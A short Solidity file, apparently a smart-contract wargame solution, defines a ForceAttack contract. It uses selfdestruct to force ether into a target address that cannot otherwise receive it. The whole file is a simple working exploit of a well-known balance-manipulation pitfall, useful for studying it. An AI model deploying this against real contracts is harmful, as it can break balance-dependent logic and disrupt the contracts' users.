// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function attack(address payable _target) external payable {
        selfdestruct(_target);
    }
}
